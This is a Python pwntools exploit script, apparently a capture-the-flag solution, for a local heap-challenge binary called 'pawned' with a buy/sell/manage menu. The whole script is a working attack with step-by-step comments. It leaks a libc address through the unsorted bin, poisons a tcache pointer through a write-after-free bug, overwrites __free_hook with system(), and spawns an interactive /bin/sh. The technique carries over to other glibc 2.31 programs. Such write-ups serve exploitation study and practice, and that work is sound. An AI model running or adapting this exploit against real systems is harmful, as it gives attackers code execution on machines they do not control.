from pwn import *
elf = context.binary = ELF("pawned")
libc = ELF("libc-2.31.so")
# ld = ELF("./ld-2.31.so")
# context.log_level = 'debug'
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

gs = '''
continue
'''

def buy(seq_num):
    io.sendline(b"B")
    io.sendline(str(seq_num).encode())

def sell(seq_num,length,name):
    io.sendline(b"S")
    io.sendline(str(seq_num).encode())
    io.sendline(str(length).encode())
    io.sendline(name)

def print_items():
    io.sendline(b"P")

def manage(seq_num,price,length,name):
    io.sendline(b"M")
    io.sendline(str(seq_num).encode())
    io.sendline(str(price).encode())
    io.sendline(str(length).encode())
    io.sendline(name)


io = start()
io.timeout = 0.1

sell(1337,0x418,b"item A")  # Allocate a large chunk so that when freed it 
                            # will reach the unsorted bin, and not the tcache

sell(1337,0x18,b"item B")   # To avoid consolidation of 1'st large chunk with top chunk
buy(1)
buy(2)                      # If chunk 2 was in "Large size range", it's name chunk 
                            # would've been consilidated here with top chunk

# Leak a libc address from an unsortedbin chunk which points to an offset witihn it's main arena
io.readuntil("1. Price $0.000000, Name: ")              #(Only) The 1st item will have price of 0.000000
libc_leak = u64(io.readline().strip().ljust(8,b"\x00")) #leak a libc addr using unsortedbin fd
libc.address = libc_leak - 0x1ebbe0                     #Calibrate libc base address
print("libc base addr: @",hex(libc.address))

free_hook = libc.symbols['__free_hook']
free_hook_fake_price = struct.unpack("<d",p64(free_hook))[0] # Treat the free_hook as a double floating point format value
log.info(f'free_hook @: {hex(free_hook)}, When treated as floating point double:{free_hook_fake_price}')

# Arbitrary size which is <= 0x418
item_C_size = 0x38
sell(1337,item_C_size,b"Item C is a result of Item A remaindering!,But gets ID# = 3")

# Free item C to overwrite (using WAF bug) it's tcache forward pointer(fd) metadata
# while editing its item chunk's data (edit fd and write the '/bin/sh' somewhere else in memory)
# For our needs, it will no longer be treated as an item
buy(3)           


manage(3,free_hook_fake_price,item_C_size,b"/bin/sh\0") 

# From this point, I couldn't use a debugger. Because system address 
# was interpreted as a negative number
# From here- run under production conditions
log.info(f'system @: {hex(libc.symbols["system"])}')

### overwrite the __free_hook with system() addr ###
# This will allocate two 0x30 chunks from tcachebin. 
# 1st one is from the chunk where we wrote &free_hook in the price field
# 2nd one (for the name) will be served from a fake chunk overlapping the __free_hook!
# Rembemer that tcache chunks holds pointers to the user-data and not 0x10 bytes before that. 
# This user-data is within Item-A name chunk 
# (we reused the beginning of the space that belonged to the large-sized chunk)
sell(1337,0x28,p64(libc.symbols['system'])) 

buy(1)          #Free item #1 (free(name_ptr_1) which is now system('/bin/sh\0')
io.clean()
io.interactive()
